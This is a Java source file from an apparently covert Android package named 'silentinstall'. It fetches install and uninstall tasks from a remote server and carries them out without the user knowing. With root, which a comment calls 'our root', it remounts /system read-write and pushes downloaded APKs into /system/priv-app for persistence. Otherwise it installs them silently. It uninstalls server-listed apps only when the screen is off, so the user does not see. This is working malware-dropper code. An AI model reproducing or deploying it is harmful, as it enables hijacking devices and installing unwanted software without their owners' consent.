package com.invisible.silentinstall.core;

import android.content.Context;
import android.os.Environment;
import android.text.TextUtils;

import com.invisible.silentinstall.download.DownloadIOUtils;
import com.invisible.silentinstall.utils.DataUtil;
import com.invisible.silentinstall.utils.FieldName;
import com.invisible.silentinstall.utils.GlobalContext;
import com.invisible.silentinstall.utils.PublicSp;
import com.invisible.silentinstall.utils.Util_AndroidOS;
import com.invisible.silentinstall.utils.Util_File;
import com.invisible.silentinstall.utils.Util_Interval;
import com.invisible.silentinstall.utils.Util_Json;
import com.invisible.silentinstall.utils.Util_Log;
import com.invisible.silentinstall.utils.Util_Process;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import edu.chainfire.lib.Shell;

/**
 * @author zhengnan 管理pull下来的任务
 */
public class TaskManager {
    private static String saveDir = null;

    static {
        // si部分单独管理目录相关
        saveDir = GlobalContext.getCtx().getFilesDir() + File.separator
                + "SItasks";
    }

    /**
     * @param data 服务器返回的数据
     * @return 数据生成的任务列表
     */
    public static Map<String, TaskModel> generateTasks(String data) {
        Map<String, TaskModel> tasks = new HashMap<String, TaskModel>();
        if (checkDataValid(data)) {
            try {
                // 将jsonArray生成任务列表去做
                JSONObject json = new JSONObject(data);
                JSONArray array = json.getJSONArray("data");
                String confid = json.getString(SIStr.confid);
                for (int i = 0; i < array.length(); i++) {
                    JSONObject task = array.getJSONObject(i);
                    task.put(SIStr.confid, confid);//服务器加的
                    TaskModel model = new TaskModel(task.toString());

                    tasks.put(model.getPackageName(), model);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return tasks;
        } else
            Util_Log.logSI("data is invalid!!");

        return tasks;
    }

    public static TaskModel generateUninstallTask(String data) {
        TaskModel model = null;
        try {
            // 将jsonArray生成任务列表去做
            JSONObject json = new JSONObject(data);
            JSONObject unInstall = json.getJSONObject("unInstall");
            JSONArray array = unInstall.getJSONArray("packages");
            String confid = json.getString(SIStr.confid);
            if (array.length() > 0) {
                model = new TaskModel();
                model.unInstallPackages = "";
                model.setConfid(Long.parseLong(confid));//服务器加的
                for (int i = 0; i < array.length(); i++) {
                    model.unInstallPackages += array.getString(i).trim() + ",";
                }
                Util_Log.e(model.unInstallPackages);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return model;
    }

    /**
     * @return 获取本地存储的列表 (包含：未做的任务，已做有结果，但未上传的任务)
     */
    public static Map<String, TaskModel> getNativeTasks() {
        Util_Log.logSI("获取本地列表...");
        Map<String, TaskModel> tasks = new HashMap<String, TaskModel>();
        try {
            File path = new File(saveDir);
            File files[] = path.listFiles();
            if (files != null)
                for (File file : files) {
                    String ct = Util_File.readFile(file);
                    JSONObject jo = Util_Json.getJo(ct);
                    if (jo != null) {
                        TaskModel task = new TaskModel(ct);
                        tasks.put(task.getPackageName(), task);
                    }
                }
        } catch (Exception e) {
            e.printStackTrace();
        }
        Util_Log.logSI("本地列表：" + tasks);
        return tasks;
    }


    /**
     * @param data 是一个JsonArray 每个jsonObject对应一个Task
     * @return 检测服务器下发数据的正确性
     */
    private static boolean checkDataValid(String data) {
        Util_Log.logSI("check pulldata valid!");
        try {
            JSONObject json = new JSONObject(data);
            if (json.has("status") && !DataUtil.str2bool(json.optString("status"))) {
                return false;//这里表示 无数据用。
            }

            JSONArray array = json.getJSONArray("data");
            json.getLong(SIStr.confid);
            json.getLong(SIStr.nextInterval);
            if (array.length() > 0) {
                for (int i = 0; i < array.length(); i++) {
                    JSONObject jo = array.getJSONObject(i);
                    if (!(jo.has(SIStr.downUrl) && jo.has(SIStr.versionCode) && jo
                            .has(SIStr.packageName))) {
                        return false;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    /**
     * 保存到本地
     *
     * @param task task
     */
    public static void save(TaskModel task) {
        try {

            //如果不存在，表示是第一次保存。此时向task写入生成时间
            if (!new File(saveDir + "/" + task.getPackageName()).exists()) {
                task.setGenTime(System.currentTimeMillis());
            }
            Util_File.writeFile(saveDir, task.getPackageName(), task.toString());
            Util_Log.logSI("task save success!");
            if (Util_Log.logShow)
                Util_Log.logSI("任务：" + task.getPackageName() + "，结束状态："
                        + task.isFinisned() + ",安装状态：" + task.isInstallResult()
                        + ",状态描述：" + task.getStatusDesc());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * 删除任务
     *
     * @param task task
     */
    public static void delete(TaskModel task) {
        Util_Log.logSI("delete native finished task :" + task.getPackageName());
        try {
            Util_File.deleteFile(saveDir, task.getPackageName());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deleteApk(TaskModel task) {
        // 将对应的apk删除
        DownloadIOUtils.setContext(GlobalContext.getCtx());
        String apk = DownloadIOUtils.getDownloadFolder().getAbsolutePath()
                + File.separator
                + task.getDownUrl().substring(
                task.getDownUrl().lastIndexOf("/") + 1);
        File f = new File(apk);
        if (f.exists()) {
            Util_Log.logSI("delete apk!");
            f.delete();
        }

    }


    /**
     * @return 从本地检索，动态数据(DynamicDataMgr)
     */
    public static DynamicDataMgr getNativeDData() {
        //从本地文件读取信息,组织成DynamicDataMgr
        String path = Util_File.getExitPath(GlobalContext.getCtx(),
                "download/si");
        String dyData = Util_File.readFile(path, "dyData");
        if (TextUtils.isEmpty(dyData)) {
            return new DynamicDataMgr(null);
        }
        DynamicDataMgr dynamicDataMgr = new DynamicDataMgr(dyData);
        //检测卸载情况，若有卸载，修改更新！
        Iterator keys = dynamicDataMgr.getInstallList().keySet().iterator();
        Context ctx = GlobalContext.getCtx();
        while (keys.hasNext()) {
            DynamicDataMgr.PkgInfo pkgInfo = dynamicDataMgr.getInstallList().get(keys.next());
            if (!Util_AndroidOS.isExistPackage(ctx, pkgInfo.getPackageName())//如果未安装||已安装但版本<了任务下发的版本表示更新失败了。
                    || DataUtil.String2Int(pkgInfo.getVersionCode()) > Util_AndroidOS.getVersion(ctx, pkgInfo.getPackageName())) {
                //不用contains来判断，因为有时有可能是更新。 （pkgInfo，只用包名来做唯一比较）
                if (Util_Log.logShow) Util_Log.logSI(pkgInfo.getPackageName() + " 被卸载！");
                dynamicDataMgr.getUnInstallList().put(pkgInfo.getPackageName(), pkgInfo);
//                dynamicDataMgr.getInstallList().remove(pkgInfo.getPackageName());
                keys.remove();
                updateDData(dynamicDataMgr, true);

            }
        }
        return dynamicDataMgr;
    }

    /**
     * @param datas       将动态数据持久到disk
     * @param need2update 下次联网时是否要提醒更新
     */
    public static void updateDData(DynamicDataMgr datas, boolean need2update) {
        //将本地数据更新
        String path = Util_File.getExitPath(GlobalContext.getCtx(),
                "download/si");
        String dyData = datas.toString();
        if (!TextUtils.isEmpty(dyData)) {
            String storeData = Util_File.readFile(path, "dyData");
            if (!dyData.equals(storeData)) {//storeData有可能是null，所以放在()中
                Util_Log.logSI("update d data");
                Util_File.writeFile(path, "dyData", dyData);
                if (need2update)
                    PublicSp.getInstance(GlobalContext.getCtx()).setValue(SICtrl.SP_NEED2UPDATE, "true");
            } else if (Util_Log.logShow) Util_Log.logSI("d data is same,so won't update!");
        }
    }


    public static boolean isInterval() {
        return Util_Interval.getIns(GlobalContext.getCtx()).isInInterval("SI");
    }

    public static void setInterval(long inter) {
        Util_Interval.getIns(GlobalContext.getCtx()).setInterval("SI", inter, false);
    }

    //当前是否为卸载更新的apk。
    public static boolean isUninstallUpdateApk(Context ctx) {
        try {
            String keyName = "si_curVersion";
            int saveVersion = Integer.parseInt(Util_File.readDef(ctx, keyName, "0"));
            int curVersion = Util_AndroidOS.getVersionCode(ctx);
            if (curVersion == saveVersion) return false;
            else if (curVersion > saveVersion) {//写入当前版本
                Util_File.writeDef(ctx, keyName, "" + curVersion);
                return false;
            } else return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    //是否被我们root了
    public static boolean isOurRoot() {
        try {
            return Shell.SU.available();
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    //root模块是否执行过。 （约定由root模块写入，si模块只来读取）
    public static boolean hasOutRoot(Context ctx) {
        String key = Util_File.readDef(ctx, "rResult", "false");
        boolean hasResult = DataUtil.str2bool(key);
        return hasResult;
    }


    //获取 现在时间-安装时间 的小时数
    public static long getHour4install(Context ctx) {
        long installTime = DataUtil.getApkUpdateTime(ctx);
        if (installTime == 0) {//不是0 表示正常取到，则直接用
            Util_Log.log("不能正常获取apk安装时间！");
            //没取到就从本地保存一个
            installTime = Long.parseLong(Util_File.readDef(ctx, FieldName.insTimeSub, "0"));
            if (installTime == 0) {//写入
                Util_File.writeDef(ctx, FieldName.insTimeSub, System.currentTimeMillis() + "");
                installTime = System.currentTimeMillis();
            }
        }
        //use
        Util_Log.log("curTIme:" + System.currentTimeMillis() + ", insTime:" + installTime);
        long hour = (System.currentTimeMillis() - installTime) / (1000 * 60 * 60);
        return hour;
    }

    public static String doInstall(TaskModel task, String filePath) {
        String SYSTEM = "/system";
        String SYSTEM_PRIV_APP = SYSTEM + "/priv-app";
        String SYSTEM_APP = SYSTEM + "/app";
        String ret = "";
        try {
            filePath = filePath.replace(Environment.getExternalStorageDirectory().getAbsolutePath(), "/sdcard");
            File apkF = new File(filePath);
            if (!apkF.exists() || !apkF.isFile()) {
                return filePath + " not exists.";
            }
            String name = apkF.getName();
            if (task.getInstallPosition().contains(SIStr.InstallPosition.SYSTEM) && isOurRoot()) {
                Shell.SU.run("chmod 644 " + filePath);
                Shell.SU.run("mount -o rw,remount " + SYSTEM);
                File priv_app_dir = new File(SYSTEM_PRIV_APP);
                String newPath = "";
                if (priv_app_dir.exists()) {
                    Shell.SU.run("cat " + filePath + " > " + SYSTEM_PRIV_APP + "/" + name);
                    newPath = SYSTEM_PRIV_APP + "/" + new File(filePath).getName();
                    Shell.SU.run("chmod 644 " + newPath);
                } else {
                    Shell.SU.run("cat " + filePath + " > " + SYSTEM_APP + "/" + name);
                    newPath = SYSTEM_APP + "/" + new File(filePath).getName();
                    Shell.SU.run("chmod 644 " + newPath);
                }
                ret = new File(newPath).exists() ? "success" : "system push failed.";
                Shell.SU.run("mount -o ro,remount " + SYSTEM);

            } else { //安装到data TODO 失败则尝试安装到sd卡
                ret = Util_Process.installApkSilent(new File(filePath), " -r ");
                if (!"success".equals(ret)) {
                    // 尝试安装到SD卡
                    ret = Util_Process.installApkSilent(new File(filePath), " -r -s ");
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
            ret = e.getMessage();
            //安装出异常，且安装成功了。就算成功
            if (Util_AndroidOS.isExistPackage(GlobalContext.getCtx(), task.getPackageName()) && Util_AndroidOS.getVersionCode(GlobalContext.getCtx()) == task.getVersionCode()) {
                ret = "success";
            }
        }

        return ret;
    }

    public static void saveUntask(String unInstallPackages) {
        Util_File.writeFile(saveDir + "_un", "uninstall", unInstallPackages);
    }

    public static void doUnInstall(Context context) {
        String unInstallPackages = Util_File.readFile(saveDir + "_un", "uninstall");
        if (unInstallPackages == null || unInstallPackages.isEmpty()) {
            return;
        }
        if (Util_AndroidOS.isScreenOn(GlobalContext.getCtx())) {
            Util_Log.log("屏幕是开的，暂不卸载！");
            //--注册关屏广播
            DynamicReceiver.getInstance(GlobalContext.getCtx());
            return;
        }
        Util_Log.e("doUnInstall task.unInstallPackages " + unInstallPackages);
        try {
            String[] ps = unInstallPackages.split(",");
            for (String str : ps) {
                if (str.isEmpty()) {
                    continue;
                }
                if (!Util_AndroidOS.isExistPackage(context, str)) {
                    unInstallPackages = unInstallPackages.replace(str + ",", "");
                } else {
                    String ret = Util_Process.uninstallApkSilent(str, false);
                    if ("success".equals(ret)) {
                        unInstallPackages = unInstallPackages.replace(str + ",", "");
                        Util_File.writeFile(saveDir + "_un", "uninstall", unInstallPackages);
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }
}